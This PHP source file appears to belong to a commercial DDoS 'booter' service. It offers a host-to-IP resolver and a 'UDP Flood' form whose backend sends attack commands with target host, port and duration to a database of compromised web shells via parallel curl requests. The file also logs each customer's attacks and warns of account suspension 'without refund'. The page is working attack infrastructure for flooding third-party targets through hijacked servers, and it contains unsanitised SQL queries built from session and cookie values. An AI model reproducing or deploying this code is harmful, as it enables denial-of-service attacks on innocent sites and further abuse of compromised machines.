<?php
require("header.php");
?>

<script src="javascript/jquery-1.4.4.min.js" type="text/javascript"></script>
<script type="text/javascript">
function hub()
	{
	if (window.XMLHttpRequest)
	  {
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent to all shells.";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>
<div class="box">
    <h2>Important Notice</h2>
    <div class="box-content">
        <p>
            <font color="red"><center><strong>Important Notice</strong></font>: Attacking the same IP Address repeatedly will result in suspension of your account without refund.</center>
        </p>
    </div>

</div>

<div class="box">
    <h2>Resolve Host to IP Address</h2>
    <div class="box-content">
        <p>
          <?php
function printForm()
{
global $www;

$action = $_SERVER["PHP_SELF"];

print <<<ENDHTM
<form method="post" action="$action">
<p>http:// <input type="text" name="www" value="$www"/> <input type="submit" value="Resolve"/></p>
</form>

ENDHTM;
}

if($_REQUEST['www'])
{
print $www;

$domain = strtolower($_REQUEST['www']);
$xArray = @parse_url($domain);

	if(!$xArray["scheme"])
	{
	$domain = "http://" . $domain;
	$xArray = @parse_url($domain);
	}

	$xProtocol = $xArray["scheme"];
	$xHost   = $xArray["host"];
	$xPort   = $xArray["port"];
	$xUser   = $xArray["user"];
	$xPass   = $xArray["pass"];
	$xPath   = $xArray["path"];
	$xQuery  = $xArray["query"];
	$xFragment = $xArray["fragment"];

	$domain = $xProtocol ."://". $xHost . $xPath . ($xQuery?"?":"") . $xQuery;
	$www = $xHost . $xPath . ($xQuery?"?":"") . $xQuery;

	printForm();

		if(@gethostbyname($xHost) == $xHost)
		{
		$ip2 = "Returned hostname";
		$hostname2 = "Cancelled";
		}
		else
		{
		$ip2 = @gethostbyname($xHost);
		$hostname2 = @gethostbyaddr($ip2);
		}
	print "<div><p><strong><font color=\"white\">IP Address</font></strong>: $ip2</p></div>\n";
	print "<div><p><strong><font color=\"white\">Hostname</font></strong>: $hostname2</p></div>\n";
}
else
{
		if(isset($_COOKIE['URL']))
		{
		$www = $_COOKIE['URL'];
		}
printForm();
}
?>
        </p>
    </div>
</div>

<div class="box">
<h2>UDP Flood</h2>
<div class="box-content">
<p>
<form>
        <table width="50%" border="0" align="center" cellpadding="3" cellspacing="3" class="forms">

          <tr>
            <td>IP/DNS</td>
            <td><input type="text" id="host" onkeypress="handleKeyPress(event,this.form)" name="host" value=""/></td>
          </tr>

          <tr>
            <td>Seconds</td>
            <td><input type="text" onkeypress="handleKeyPress(event,this.form)" id="time" name="time" value="30"/></td>
          </tr>

          <tr>
            <td>Port</td>
            <td><input type="text" name="port" onkeypress="handleKeyPress(event,this.form)" value="80"/></td>
          </tr>

          <tr>
            <td></td>
            <td><input type="submit" value="Initiate Attack" onclick="hub();" /></td>
          </tr>

      </table>
<form>
  </p>
<form>
</form>
		 <form action="hub.php" method="post">
		  &nbsp;
		  </p>
                 </form>
<p id="sent"></p>
<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
function handleEnterPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		getip();
	}
}
</script>
<?php
set_time_limit(10);
ignore_user_abort(TRUE);

include 'includes/EpiCurl.php';
require("includes/ezSQLCore.php");
require("includes/ezSQL.php");

$query = mysql_query("SELECT * FROM `users` WHERE `id`='$_SESSION[user_id]' AND `banned`=1") or die(mysql_error());
if (mysql_num_rows($query) > 0) {
	mysql_query("update `users`
		set `ckey`= '', `ctime`= ''
		where `id`='$_SESSION[user_id]' OR  `id` = '$_COOKIE[user_id]'") or die(mysql_error());
	unset($_SESSION['user_id']);
	unset($_SESSION['user_name']);
	unset($_SESSION['user_level']);
	unset($_SESSION['HTTP_USER_AGENT']);
	session_unset();
	session_destroy();
	setcookie("user_id", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_name", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_key", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	die("You do not have permission to view this page.");
}

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_NAME);
	$Query = "SELECT * FROM `getshells`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


if($time >= 121) {
die("<hr>You cannot issue attacks exceeding 120 seconds.");
}

if($host == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($time == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($port == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr>You cannot attack this."); }


/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&host={$host}&time={$time}&port={$port}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }

	$Query = "SELECT * FROM `postshells`";
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";

    for($i = 0; $i < $AffectedRows; $i++)
    {
		$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;
        $header = array();
		$header[] = "Cache-Control: max-age=0";
		$header[] = "Connection: keep-alive";
		$header[] = "Keep-Alive: 300";
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
		$header[] = "Accept-Language: en-us,en;q=0.5";
		$header[] = "Pragma: ";
        $ch2[$i] = curl_init($shell);
		curl_setopt($ch2[$i], CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch2[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2[$i], CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch2[$i], CURLOPT_POST, 1);
        curl_setopt($ch2[$i], CURLOPT_POSTFIELDS, $post);
        $curl1 = $mc->addCurl($ch2[$i]);
    }

echo "<p id='sent'><center><strong><font color=\"lime\">Attack has been sent!</font></strong></center></p>";

$username = $_SESSION['user_name'];
$host = strip_tags(mysql_real_escape_string($_GET['host']));
$time = strip_tags(mysql_real_escape_string($_GET['time']));
$port = strip_tags(mysql_real_escape_string($_GET['port']));
$date = date("m-d-Y, h:i:s a", time());

mysql_query("INSERT INTO logs
(username, ip, time, port, date) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "', '" . $date . "' ) ")
or die(mysql_error());

mysql_query("UPDATE users set myAttacks = myAttacks + 1 WHERE full_name = '" . $username . "'") or die(mysql_error());

}
?>

</div>
</div>
</body>
</html>

<br>

<?php
include 'footer.php';
?>